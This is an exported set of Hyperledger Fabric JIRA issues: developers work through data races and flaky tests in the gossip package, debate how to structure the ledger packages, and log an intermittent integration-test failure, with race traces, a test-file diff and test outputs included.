I did this on 6 core linux laptop with go 1.14 on current master.",,Unset,,,,,,Unset,,Unset,,(Please add usage information),MHBauer,sykesm,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"13/Mar/20 3:40 AM;yacovm;https://github.com/hyperledger/fabric/pull/847;;;","13/Mar/20 4:45 AM;sykesm;There were several races in gossip. Looks like PR 847 fixes the one in the gossip/gossip package but not the ones in the gossip/state package.;;;","13/Mar/20 5:00 AM;yacovm;I know, I am making a PR for every data race.

 

https://github.com/hyperledger/fabric/pull/849;;;","13/Mar/20 5:31 AM;yacovm;https://github.com/hyperledger/fabric/pull/850;;;","14/Mar/20 9:15 PM;yacovm;When running *for d in `ls`; do cd $d; go test -race -count 1 .; cd .. ; done* it seems that all data races have been cleared.

 

It's still not possible to run gossip with *./gossip/...* due to (I guess) port conflicts, but can you confirm the data races have been solved, [~sykesm] ?;;;","14/Mar/20 10:31 PM;sykesm;Not on my end.

{code}
==================                                                                                                                                                                   
WARNING: DATA RACE                                                                                                                                                                   
Write at 0x00c006090a80 by goroutine 170:                                                                                                                                            
  github.com/hyperledger/fabric/gossip/discovery.(*gossipDiscoveryImpl).learnExistingMembers()                                                                                       
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/gossip/discovery/discovery_impl.go:840 +0x6ef                                                                  
  github.com/hyperledger/fabric/gossip/discovery.(*gossipDiscoveryImpl).handleAliveMessage()                                                                                         
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/gossip/discovery/discovery_impl.go:541 +0xcfd                                                                  
  github.com/hyperledger/fabric/gossip/discovery.(*gossipDiscoveryImpl).handleMsgFromComm()                                                                                          
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/gossip/discovery/discovery_impl.go:337 +0x8e8                                                                  
  github.com/hyperledger/fabric/gossip/discovery.(*gossipDiscoveryImpl).handleMessages()                                                                                             
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/gossip/discovery/discovery_impl.go:305 +0x18a                                                                  
                                                                                                                                                                                     
Previous read at 0x00c006090a80 by goroutine 151:                                                                                                                                    
  github.com/hyperledger/fabric/gossip/discovery.(*NetworkMember).String()                                                                                                           
      <autogenerated>:1 +0x77                                                                                                                                                        
  fmt.(*pp).handleMethods()                                                                                                                                                          
      /usr/local/go/src/fmt/print.go:630 +0x4bf                                                                                                                                      
  fmt.(*pp).printArg()                                                                                                                                                               
      /usr/local/go/src/fmt/print.go:713 +0x193                                                                                                                                      
  fmt.(*pp).doPrintln()                                                                                                                                                              
      /usr/local/go/src/fmt/print.go:1173 +0xad                                                                                                                                      
  fmt.Sprintln()                                                                                                                                                                     
      /usr/local/go/src/fmt/print.go:281 +0x5f                                                                                                                                       
  github.com/hyperledger/fabric/common/flogging.formatArgs()                                                                                                                         
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/common/flogging/zap.go:105 +0x50                                                                               
  github.com/hyperledger/fabric/common/flogging.(*FabricLogger).Warning()                                                                                                            
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/common/flogging/zap.go:79 +0x70                                                                                
  github.com/hyperledger/fabric/gossip/discovery.(*gossipDiscoveryImpl).expireDeadMembers()                                                                                          
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/gossip/discovery/discovery_impl.go:731 +0x44a                                                                  
  github.com/hyperledger/fabric/gossip/discovery.(*gossipDiscoveryImpl).periodicalCheckAlive()                                                                                       
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/gossip/discovery/discovery_impl.go:697 +0x30c                                                                  
                                                                                                                                                                                     
Goroutine 170 (running) created at:                                                                                                                                                  
  github.com/hyperledger/fabric/gossip/discovery.NewDiscoveryService()                                                                                                               
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/gossip/discovery/discovery_impl.go:122 +0x937                                                                  
  github.com/hyperledger/fabric/gossip/gossip.New()                                                                                                                                  
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/gossip/gossip/gossip_impl.go:131 +0x160a                                                                       
  github.com/hyperledger/fabric/gossip/gossip.newGossipInstanceWithGrpcMcsMetrics()                                                                                                  
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/gossip/gossip/gossip_test.go:249 +0x892                                                                        
  github.com/hyperledger/fabric/gossip/gossip.TestDataLeakage.func1()                                                                                                                
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/gossip/gossip/gossip_test.go:1071 +0x385                                                                       
                                                                                                                                                                                     
Goroutine 151 (running) created at:                                                                                                                                                  
  github.com/hyperledger/fabric/gossip/discovery.NewDiscoveryService()                                                                                                               
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/gossip/discovery/discovery_impl.go:121 +0x912                                                                  
  github.com/hyperledger/fabric/gossip/gossip.New()                                                                                                                                  
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/gossip/gossip/gossip_impl.go:131 +0x160a                                                                       
  github.com/hyperledger/fabric/gossip/gossip.newGossipInstanceWithGrpcMcsMetrics()                                                                                                  
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/gossip/gossip/gossip_test.go:249 +0x892                                                                        
  github.com/hyperledger/fabric/gossip/gossip.TestDataLeakage.func1()                                                                                                                
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/gossip/gossip/gossip_test.go:1071 +0x385                                                                       
================== 
{code};;;","15/Mar/20 4:33 AM;yacovm;I'm unable to reproduce it locally but I pushed [https://github.com/hyperledger/fabric/pull/859] which should fix it;;;","06/Apr/20 8:47 PM;yacovm;[~sykesm] are they still failing for you?;;;","06/Apr/20 9:47 PM;sykesm;> Matthew Sykes are they still failing for you?

Sort of. They're running out of memory now so I have no idea if they're racing.

{code}
==24719==ERROR: ThreadSanitizer failed to allocate 0x80000 (524288) bytes of clock allocator (error code: 12)
FATAL: ThreadSanitizer CHECK failed: ./gotsan.cpp:7064 ""((0 && ""unable to mmap"")) != (0)"" (0x0, 0x0)
{code};;;","06/Apr/20 9:54 PM;yacovm;Did you run them package by package or together?;;;","06/Apr/20 10:06 PM;sykesm;I was setting up to run the tests multiple times but it's failing consistently on the first run.

This is the command I used:
{code}
(ulimit -a; set -e; for i in $(seq 1 1); do echo $i; go test -race -p 1 -cover -count 1 ./gossip/...; done)
{code}

Memory is ""unlimited"" and running on a machine with 8G. The {{-p 1}} flag ensures they are run package by package (sequentially).

{code}
2020-04-06 09:01:47.381 EDT [gossip.comm] sendToEndpoint -> WARN 1f5d Failed obtaining connection for 1.2.3.4:43495, PKIid:3132372e302e302e313a3433343935 reason: context deadline exceeded
==29898==ERROR: ThreadSanitizer failed to allocate 0x80000 (524288) bytes of clock allocator (error code: 12)
FATAL: ThreadSanitizer CHECK failed: ./gotsan.cpp:7064 ""((0 && ""unable to mmap"")) != (0)"" (0x0, 0x0)
FAIL	github.com/hyperledger/fabric/gossip/gossip	111.562s
{code};;;","06/Apr/20 10:17 PM;sykesm;I got one good run. Make me think the memory issues show up when test assertions fail.

 !screenshot-1.png|thumbnail! ;;;","06/Apr/20 11:31 PM;yacovm;{quote}I got one good run. Make me think the memory issues show up when test assertions fail.{quote}

If assertions fail it's likely due to the test being too slow, and this is because of race detector + everything running in parallel in the gossip package. 

 

When I disable the parallelism of the tests in the package, things are smooth:

{code}
yacovm@~/gopath/src/github.com/hyperledger/fabric (master) $ (ulimit -a; set -e; for i in $(seq 1 1); do echo $i; go test -race -p 1 -cover -count 1 ./gossip/...; done)
core file size          (blocks, -c) 0
data seg size           (kbytes, -d) unlimited
scheduling priority             (-e) 0
file size               (blocks, -f) unlimited
pending signals                 (-i) 126387
max locked memory       (kbytes, -l) 64
max memory size         (kbytes, -m) unlimited
open files                      (-n) 4096
pipe size            (512 bytes, -p) 8
POSIX message queues     (bytes, -q) 819200
real-time priority              (-r) 0
stack size              (kbytes, -s) 8192
cpu time               (seconds, -t) unlimited
max user processes              (-u) 4096
virtual memory          (kbytes, -v) unlimited
file locks                      (-x) unlimited
1
ok  	github.com/hyperledger/fabric/gossip/api	0.032s	coverage: 97.4% of statements
?   	github.com/hyperledger/fabric/gossip/api/mocks	[no test files]
ok  	github.com/hyperledger/fabric/gossip/comm	18.574s	coverage: 93.0% of statements
ok  	github.com/hyperledger/fabric/gossip/comm/mock	0.174s	coverage: 81.1% of statements
ok  	github.com/hyperledger/fabric/gossip/common	0.032s	coverage: 100.0% of statements
ok  	github.com/hyperledger/fabric/gossip/discovery	75.528s	coverage: 86.4% of statements
ok  	github.com/hyperledger/fabric/gossip/election	7.022s	coverage: 94.4% of statements
ok  	github.com/hyperledger/fabric/gossip/filter	0.185s	coverage: 100.0% of statements
ok  	github.com/hyperledger/fabric/gossip/gossip	147.050s	coverage: 85.6% of statements
ok  	github.com/hyperledger/fabric/gossip/gossip/algo	4.677s	coverage: 96.9% of statements
ok  	github.com/hyperledger/fabric/gossip/gossip/channel	16.250s	coverage: 92.3% of statements
ok  	github.com/hyperledger/fabric/gossip/gossip/msgstore	8.185s	coverage: 100.0% of statements
ok  	github.com/hyperledger/fabric/gossip/gossip/pull	2.795s	coverage: 92.6% of statements
ok  	github.com/hyperledger/fabric/gossip/identity	12.200s	coverage: 100.0% of statements
ok  	github.com/hyperledger/fabric/gossip/metrics	0.034s	coverage: 100.0% of statements
?   	github.com/hyperledger/fabric/gossip/metrics/mocks	[no test files]
ok  	github.com/hyperledger/fabric/gossip/privdata	19.957s	coverage: 84.6% of statements
?   	github.com/hyperledger/fabric/gossip/privdata/common	[no test files]
?   	github.com/hyperledger/fabric/gossip/privdata/mocks	[no test files]
ok  	github.com/hyperledger/fabric/gossip/protoext	0.033s	coverage: 95.5% of statements
ok  	github.com/hyperledger/fabric/gossip/service	82.087s	coverage: 83.8% of statements
?   	github.com/hyperledger/fabric/gossip/service/mocks	[no test files]
ok  	github.com/hyperledger/fabric/gossip/state	23.051s	coverage: 80.1% of statements
ok  	github.com/hyperledger/fabric/gossip/state/mocks	0.185s	coverage: 55.6% of statements
ok  	github.com/hyperledger/fabric/gossip/util	4.284s	coverage: 73.6% of statements

{code}
 
Diff:
{code}
diff --git a/gossip/gossip/anchor_test.go b/gossip/gossip/anchor_test.go
index eadaf49cb..e6dcf9f81 100644
--- a/gossip/gossip/anchor_test.go
+++ b/gossip/gossip/anchor_test.go
@@ -159,7 +159,6 @@ func memResp(nonce uint64, endpoint string) *protoext.SignedGossipMessage {
 type msgInspection func(t *testing.T, index int, m *receivedMsg)
 
 func TestAnchorPeer(t *testing.T) {
-	t.Parallel()
 	// Actors:
 	// OrgA: {
 	// 	p:   a real gossip instance
@@ -267,7 +266,6 @@ func TestAnchorPeer(t *testing.T) {
 }
 
 func TestBootstrapPeerMisConfiguration(t *testing.T) {
-	t.Parallel()
 	// Scenario:
 	// The peer 'p' is a peer in orgA
 	// Peers bs1 and bs2 are bootstrap peers.
diff --git a/gossip/gossip/gossip_test.go b/gossip/gossip/gossip_test.go
index faaf21403..624e81989 100644
--- a/gossip/gossip/gossip_test.go
+++ b/gossip/gossip/gossip_test.go
@@ -340,7 +340,6 @@ func (g *gossipGRPC) Stop() {
 }
 
 func TestLeaveChannel(t *testing.T) {
-	t.Parallel()
 	// Scenario: Have 3 peers in a channel and make one of them leave it.
 	// Ensure the peers don't recognize the other peer when it left the channel
 
@@ -386,7 +385,6 @@ func TestLeaveChannel(t *testing.T) {
 }
 
 func TestPull(t *testing.T) {
-	t.Parallel()
 	t1 := time.Now()
 	// Scenario: Turn off forwarding and use only pull-based gossip.
 	// First phase: Ensure full membership view for all nodes
@@ -477,7 +475,6 @@ func TestPull(t *testing.T) {
 }
 
 func TestConnectToAnchorPeers(t *testing.T) {
-	t.Parallel()
 	// Scenario: spawn 10 peers, and have them join a channel
 	// of 3 anchor peers that don't exist yet.
 	// Wait 5 seconds, and then spawn a random anchor peer out of the 3.
@@ -554,7 +551,6 @@ func TestConnectToAnchorPeers(t *testing.T) {
 }
 
 func TestMembership(t *testing.T) {
-	t.Parallel()
 	t1 := time.Now()
 	// Scenario: spawn 20 nodes and a single bootstrap node and then:
 	// 1) Check full membership views for all nodes but the bootstrap node.
@@ -642,7 +638,6 @@ func TestMembership(t *testing.T) {
 }
 
 func TestNoMessagesSelfLoop(t *testing.T) {
-	t.Parallel()
 
 	port0, grpc0, certs0, secDialOpts0, _ := util.CreateGRPCLayer()
 	boot := newGossipInstanceWithGRPC(0, port0, grpc0, certs0, secDialOpts0, 100)
@@ -703,7 +698,6 @@ func TestNoMessagesSelfLoop(t *testing.T) {
 }
 
 func TestDissemination(t *testing.T) {
-	t.Parallel()
 	t1 := time.Now()
 	// Scenario: 20 nodes and a bootstrap node.
 	// The bootstrap node sends 10 messages and we count
@@ -835,7 +829,6 @@ func TestDissemination(t *testing.T) {
 }
 
 func TestMembershipConvergence(t *testing.T) {
-	t.Parallel()
 	// Scenario: Spawn 12 nodes and 3 bootstrap peers
 	// but assign each node to its bootstrap peer group modulo 3.
 	// Then:
@@ -940,7 +933,6 @@ func TestMembershipConvergence(t *testing.T) {
 }
 
 func TestMembershipRequestSpoofing(t *testing.T) {
-	t.Parallel()
 	// Scenario: g1, g2, g3 are peers, and g2 is malicious, and wants
 	// to impersonate g3 when sending a membership request to g1.
 	// Expected output: g1 should *NOT* respond to g2,
@@ -1015,7 +1007,6 @@ func TestMembershipRequestSpoofing(t *testing.T) {
 }
 
 func TestDataLeakage(t *testing.T) {
-	t.Parallel()
 	// Scenario: spawn some nodes and let them all
 	// establish full membership.
 	// Then, have half be in channel A and half be in channel B.
@@ -1158,7 +1149,6 @@ func TestDisseminateAll2All(t *testing.T) {
 	// Ensure all blocks are received
 
 	t.Skip()
-	t.Parallel()
 	stopped := int32(0)
 	go waitForTestCompletion(&stopped, t)
 
@@ -1235,7 +1225,6 @@ func TestDisseminateAll2All(t *testing.T) {
 }
 
 func TestSendByCriteria(t *testing.T) {
-	t.Parallel()
 
 	port0, grpc0, certs0, secDialOpts0, _ := util.CreateGRPCLayer()
 	g1 := newGossipInstanceWithGRPC(0, port0, grpc0, certs0, secDialOpts0, 100)
@@ -1393,7 +1382,6 @@ func TestSendByCriteria(t *testing.T) {
 }
 
 func TestIdentityExpiration(t *testing.T) {
-	t.Parallel()
 	// Scenario: spawn 5 peers and make the MessageCryptoService revoke one of the first 4.
 	// The last peer's certificate expires after a few seconds.
 	// Eventually, the rest of the peers should not be able to communicate with
@@ -1600,7 +1588,6 @@ func checkPeersMembership(t *testing.T, peers []*gossipGRPC, n int) func() bool
 }
 
 func TestMembershipMetrics(t *testing.T) {
-	t.Parallel()
 
 	wg0 := sync.WaitGroup{}
 	wg0.Add(1)
diff --git a/gossip/gossip/orgs_test.go b/gossip/gossip/orgs_test.go
index 1afc60d7c..879b2e922 100644
--- a/gossip/gossip/orgs_test.go
+++ b/gossip/gossip/orgs_test.go
@@ -143,7 +143,6 @@ func newGossipInstanceWithGRPCWithExternalEndpoint(id int, port int, gRPCServer
 }
 
 func TestMultipleOrgEndpointLeakage(t *testing.T) {
-	t.Parallel()
 	// Scenario: create 2 organizations, each with 5 peers.
 	// Both organizations will have an anchor peer each
 	// The first 2 peers of each org would have an external endpoint, the rest won't.
@@ -271,7 +270,6 @@ func TestMultipleOrgEndpointLeakage(t *testing.T) {
 }
 
 func TestConfidentiality(t *testing.T) {
-	t.Parallel()
 	// Scenario: create 4 organizations: {A, B, C, D}, each with 3 peers.
 	// Make only the first 2 peers have an external endpoint.
 	// Also, add the peers to the following channels:
{code}
 
We can just remove the parallelism and then we should be able to run with race detector.... what do you think?;;;","07/Apr/20 2:39 AM;sykesm;I did a local change to my tree that removed all calls to {{t.Parallel()}} from the gossip packages.

{code}sed -i '/t.Parallel\(\)/d' $(ag -lQ 'Parallel()' ./gossip){code}

After doing that, I was able to run the tests with the race detector enabled (and without the {{-p 1}} flag) 10 times.

{code}
$ (set -e; for i in $(seq 1 10); do echo $i; time go test -race -cover -count 1 ./gossip/...; done)
...
real	4m2.906s
user	4m56.582s
sys	0m42.212s
10
ok  	github.com/hyperledger/fabric/gossip/api	0.046s	coverage: 97.4% of statements
?   	github.com/hyperledger/fabric/gossip/api/mocks	[no test files]
ok  	github.com/hyperledger/fabric/gossip/comm	55.240s	coverage: 93.0% of statements
ok  	github.com/hyperledger/fabric/gossip/comm/mock	0.202s	coverage: 81.1% of statements
ok  	github.com/hyperledger/fabric/gossip/common	0.020s	coverage: 100.0% of statements
ok  	github.com/hyperledger/fabric/gossip/discovery	244.676s	coverage: 86.4% of statements
ok  	github.com/hyperledger/fabric/gossip/election	36.895s	coverage: 94.4% of statements
ok  	github.com/hyperledger/fabric/gossip/filter	0.205s	coverage: 100.0% of statements
ok  	github.com/hyperledger/fabric/gossip/gossip	138.604s	coverage: 85.3% of statements
ok  	github.com/hyperledger/fabric/gossip/gossip/algo	19.315s	coverage: 96.9% of statements
ok  	github.com/hyperledger/fabric/gossip/gossip/channel	48.013s	coverage: 92.3% of statements
ok  	github.com/hyperledger/fabric/gossip/gossip/msgstore	20.195s	coverage: 100.0% of statements
ok  	github.com/hyperledger/fabric/gossip/gossip/pull	4.067s	coverage: 92.6% of statements
ok  	github.com/hyperledger/fabric/gossip/identity	12.191s	coverage: 100.0% of statements
ok  	github.com/hyperledger/fabric/gossip/metrics	0.018s	coverage: 100.0% of statements
?   	github.com/hyperledger/fabric/gossip/metrics/mocks	[no test files]
ok  	github.com/hyperledger/fabric/gossip/privdata	35.224s	coverage: 84.6% of statements
?   	github.com/hyperledger/fabric/gossip/privdata/common	[no test files]
?   	github.com/hyperledger/fabric/gossip/privdata/mocks	[no test files]
ok  	github.com/hyperledger/fabric/gossip/protoext	0.029s	coverage: 95.5% of statements
ok  	github.com/hyperledger/fabric/gossip/service	102.731s	coverage: 83.8% of statements
?   	github.com/hyperledger/fabric/gossip/service/mocks	[no test files]
ok  	github.com/hyperledger/fabric/gossip/state	93.501s	coverage: 79.5% of statements
ok  	github.com/hyperledger/fabric/gossip/state/mocks	0.184s	coverage: 55.6% of statements
ok  	github.com/hyperledger/fabric/gossip/util	4.266s	coverage: 73.6% of statements

real	4m7.472s
user	4m53.421s
sys	0m43.351s
{code}

I believe removing the _parallel_ markers from the tests is the right thing to do. I don't think it hurts much in terms of execution time (likely much less than being forced to run packages sequentially) but does seem to increase the test stability. I'd support that change. On my system, the runs with parallel packages took just over 4 minutes (see above) while runs with serial packages take over 13m (see below).

{code}
$ (set -e; for i in $(seq 1 1); do echo $i; time go test -race -p 1 -cover -count 1 ./gossip/...; done)
1
ok  	github.com/hyperledger/fabric/gossip/api	0.029s	coverage: 97.4% of statements
?   	github.com/hyperledger/fabric/gossip/api/mocks	[no test files]
ok  	github.com/hyperledger/fabric/gossip/comm	57.415s	coverage: 94.3% of statements
ok  	github.com/hyperledger/fabric/gossip/comm/mock	0.203s	coverage: 81.1% of statements
ok  	github.com/hyperledger/fabric/gossip/common	0.018s	coverage: 100.0% of statements
ok  	github.com/hyperledger/fabric/gossip/discovery	247.124s	coverage: 86.4% of statements
ok  	github.com/hyperledger/fabric/gossip/election	36.579s	coverage: 94.4% of statements
ok  	github.com/hyperledger/fabric/gossip/filter	0.191s	coverage: 100.0% of statements
ok  	github.com/hyperledger/fabric/gossip/gossip	139.102s	coverage: 85.6% of statements
ok  	github.com/hyperledger/fabric/gossip/gossip/algo	19.317s	coverage: 96.9% of statements
ok  	github.com/hyperledger/fabric/gossip/gossip/channel	48.011s	coverage: 92.3% of statements
ok  	github.com/hyperledger/fabric/gossip/gossip/msgstore	20.198s	coverage: 100.0% of statements
ok  	github.com/hyperledger/fabric/gossip/gossip/pull	4.068s	coverage: 92.6% of statements
ok  	github.com/hyperledger/fabric/gossip/identity	12.192s	coverage: 100.0% of statements
ok  	github.com/hyperledger/fabric/gossip/metrics	0.018s	coverage: 100.0% of statements
?   	github.com/hyperledger/fabric/gossip/metrics/mocks	[no test files]
ok  	github.com/hyperledger/fabric/gossip/privdata	35.070s	coverage: 84.6% of statements
?   	github.com/hyperledger/fabric/gossip/privdata/common	[no test files]
?   	github.com/hyperledger/fabric/gossip/privdata/mocks	[no test files]
ok  	github.com/hyperledger/fabric/gossip/protoext	0.039s	coverage: 95.5% of statements
ok  	github.com/hyperledger/fabric/gossip/service	84.775s	coverage: 83.8% of statements
?   	github.com/hyperledger/fabric/gossip/service/mocks	[no test files]
ok  	github.com/hyperledger/fabric/gossip/state	92.966s	coverage: 79.5% of statements
ok  	github.com/hyperledger/fabric/gossip/state/mocks	0.181s	coverage: 55.6% of statements
ok  	github.com/hyperledger/fabric/gossip/util	4.244s	coverage: 73.6% of statements

real	13m42.966s
user	5m6.330s
sys	0m39.795s
{code}

If you think the conflicting port range issues have been addressed, I think we can remove gossip from the `serial packages` list in the unit test script as well.
;;;","07/Apr/20 2:46 AM;yacovm;I suggest we do 1 thing at a time... first remove parallelism and add the data race detection flag, wait a week and see if AZP likes it or not. 
If things appear stable then we can try to not execute them serially. ;;;","07/Apr/20 6:52 AM;yacovm;OK so in the meantime I will close this JIRA and we can see if data races pop again and then re-open it.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Simplify fabric/core/ledger package structure,FAB-17609,44551,,Task,In Progress,FAB,Fabric,software,denyeart,,,Medium,,Senthil1,denyeart,denyeart,13/Mar/20 2:38 AM,19/Apr/20 12:41 PM,28/Oct/23 3:09 AM,,,,,,,,,,,v2.2.0,,,,fabric-ledger,,,,,,,,,0,,,,,,"# The core/ledger folder depth is high which creates difficulties in code traversal and code reading for beginners. In the long run, having a deeper folder depth is going to create some hurdles whenever we add new features. Moreover, we know that we can do better than this and that is a good enough motivation for doing this refactoring.
 # There are many packages. It is difficult to keep in mind what a package does. If the package name can give a brief summary of the task performed in that package, it would definitely improve the readability.

Please refer to the sub-tasks for more details.",,btl5037,C0rWin,denyeart,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00wur:0idqz",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,C0rWin,denyeart,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"13/Mar/20 4:55 AM;btl5037;I'd just like to comment as an extension of the discussion on our call this morning, as someone who has spent time in these directories trying to improve UT times, I can say, its tactically impossible to navigate or understand from the folder structure and names what everything is doing. Not to mention jumping around between utility files can often make minor changes difficult to keep up with as it affects many files on many paths when the sole consumers of all of these utilities are contained in one file.

While I understand Manish's point on limiting the scope of the file and pushing utils out to util packages, idiomatic go says we don't name the packages util and they should provide utility to more than one consumer, and even then if it makes sense, they should exist within the consumer, even if they duplicate code.

Here is Dave Cheney's (a Go maintainer and one of the foremost advocate on idiomatic Go) statement on the topic: [https://dave.cheney.net/2019/01/08/avoid-package-names-like-base-util-or-common];;;","13/Mar/20 11:11 AM;Senthil1;Good usage of util package can be found in the Kubernetes repo – It supports nearly 26 [volume types|https://github.com/kubernetes/kubernetes/tree/9d0cbb7503b7070817b3ec08e76f3f3addf3675b/pkg/volume]. As all these volumes require certain common utility functions. Hence, they have made a [util folder|https://github.com/kubernetes/kubernetes/tree/9d0cbb7503b7070817b3ec08e76f3f3addf3675b/pkg/volume/util] to keep all these utilities as these are used by many other packages. Here, the duplication of code in 26 packages would be too much overhead in terms of code Maintainance when one util function needs to be changed. If a utility function is used in a single place, I agree that we do not need a separate package and it should stay within the package where it is used. 

This is also important – taken from the above link –

 
{quote}For example, the {{net/http}}{{ package does not have }}{{client}}{{ and }}{{server }}packages, instead it has {{client.go}}{{ and }}{{server.go}}{{ files, each holding their respective types. transport.go}}{{ holds for the common message transport code used by both HTTP clients and servers.}}
{quote}
 

I quickly looked at other projects which are based on go – golang, kubernetes, prometheus, docker, influxDB, cockroachDB. They have used lesser packages in general and more number of files per package. Even some packages had more than 20/30 files. This is true for C based project such as PostgreSQL (C does not have a concept of package but the number of folders is low and the number of files per folder is high).;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Intermittent test failure in pvtdata integration suite,FAB-17610,44552,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Duplicate,,dereckluo,dereckluo,13/Mar/20 5:07 AM,16/Mar/20 11:48 PM,28/Oct/23 3:09 AM,16/Mar/20 11:48 PM,,,,,,,,,,,,,,,,,,,,,,,0,ci-flake,,,,,"integration test flak for /github.com/hyperledger/fabric/integration/pvtdata/implicit_coll_test.go.
logs attached.


{code:java}
2020-03-12T18:39:38.3820326Z [37m/home/vsts/work/1/go/src/github.com/hyperledger/fabric/integration/pvtdata/implicit_coll_test.go:85[0m
2020-03-12T18:39:38.3820550Z 
2020-03-12T18:39:38.3820917Z   [91mNo future change is possible.  Bailing out early after 26.889s.
2020-03-12T18:39:38.3821114Z   Expected
2020-03-12T18:39:38.3821239Z       <int>: 1
2020-03-12T18:39:38.3821440Z   to match exit code:
2020-03-12T18:39:38.3821689Z       <int>: 0[0m
2020-03-12T18:39:38.3821796Z 
2020-03-12T18:39:38.3822047Z   /home/vsts/work/1/go/src/github.com/hyperledger/fabric/integration/nwo/deploy.go:247
2020-03-12T18:39:38.3822537Z [90m------------------------------[0m
2020-03-12T18:39:38.3822666Z 
2020-03-12T18:39:38.3822739Z 
2020-03-12T18:39:38.3823071Z [91m[1mSummarizing 1 Failure:[0m
2020-03-12T18:39:38.3823211Z 
2020-03-12T18:39:38.3823805Z [91m[1m[Fail] [0m[90mPvtdata dissemination for implicit collection [0m[91m[1m[BeforeEach] disseminates pvtdata of implicit collection for the peer's own org but not implicit collection for another org [0m
2020-03-12T18:39:38.3824498Z [37m/home/vsts/work/1/go/src/github.com/hyperledger/fabric/integration/nwo/deploy.go:247[0m
2020-03-12T18:39:38.3824705Z 
2020-03-12T18:39:38.3824985Z [1m[91mRan 22 of 22 Specs in 1119.571 seconds[0m
2020-03-12T18:39:38.3825460Z [1m[91mFAIL![0m -- [32m[1m21 Passed[0m | [91m[1m1 Failed[0m | [33m[1m0 Pending[0m | [36m[1m0 Skipped[0m
2020-03-12T18:39:38.3825907Z --- FAIL: TestEndToEnd (1119.57s)
{code}
",,caod,dereckluo,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"13/Mar/20 5:05 AM;dereckluo;3-12.txt;https://jira.hyperledger.org/secure/attachment/18168/3-12.txt",,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i019xn:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,dereckluo,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"16/Mar/20 11:48 PM;caod;duplicate of FAB-17611 ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Intermittent test failure in pvtdata integration - Pvtdata dissemination for implicit collection [BeforeEach] disseminates pvtdata of implicit collection for the peer's own org but not implicit collection for another org,FAB-17611,44553,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Done,wenjian,sykesm,sykesm,13/Mar/20 5:08 AM,31/Mar/20 2:08 AM,28/Oct/23 3:09 AM,31/Mar/20 2:08 AM,v2.x,,,,,,,,,,,,,fabric-ledger,,,,,,,,,0,ci-flake,,,,,"2020-03-12T19:08:55.2267020Z Summarizing 1 Failure:

2020-03-12T19:08:55.2267338Z 

2020-03-12T19:08:55.2268356Z [Fail] Pvtdata dissemination for implicit collection [BeforeEach] disseminates pvtdata of implicit collection for the peer's own org but not implicit collection for another org 

2020-03-12T19:08:55.2269837Z /home/vsts/work/1/go/src/github.com/hyperledger/fabric/integration/nwo/deploy.go:247

2020-03-12T19:08:55.2270186Z 

2020-03-12T19:08:55.2270625Z Ran 22 of 22 Specs in 1221.621 seconds

